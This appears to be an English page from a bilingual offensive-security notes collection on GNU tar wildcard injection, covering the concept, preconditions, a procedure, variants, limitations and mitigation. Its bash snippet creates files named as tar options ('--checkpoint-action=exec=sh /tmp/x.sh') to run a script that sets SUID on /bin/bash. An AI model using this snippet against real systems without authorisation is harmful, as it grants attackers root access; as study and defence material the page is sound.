---
topic: tar wildcard injection
tags: [linux, tar, wildcard, privesc, checkpoint]
---

# tar wildcard injection

[🌐 Español](tar-wildcard-injection.md) | **English**

## Concept

A privileged script runs `tar` with `*` inside a writable directory. Filenames starting with `--` are parsed as options, not paths. GNU tar can execute commands through `--checkpoint-action`.

## When it applies

- Backups scheduled by cron, systemd or sudo.
- `tar -czf backup.tar *` or `tar -cf ... ./*`.
- A working directory writable by the attacker.

## Procedure

1. Locate the script and confirm it uses a wildcard.
2. Create files named like options.
3. Wait for the timer or run the script if allowed.
4. Use an action that leaves a SUID binary or reverse shell.

```bash
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/x.sh
chmod +x /tmp/x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh /tmp/x.sh'
```

## Variants

- `--to-command` instead of `--checkpoint-action`.
- Manipulable `TAR_OPTIONS`.
- `find`/`-exec` backups over controlled names.

## Limitations

- The wildcard must expand inside the writable directory.
- The tar version must support the option.
- The script must run with higher privileges.

## Mitigation and detection

- Use `--` before paths and avoid wildcards.
- Keep backups outside writable directories.
- Run backups as a dedicated, shell-less user.
- Alert on files named `--*` and `checkpoint-action` in processes.

## References

- <https://www.gnu.org/software/tar/manual/html_node/checkpoint.html>
- <https://gtfobins.github.io/gtfobins/tar/>
- <https://attack.mitre.org/techniques/T1059/004/>
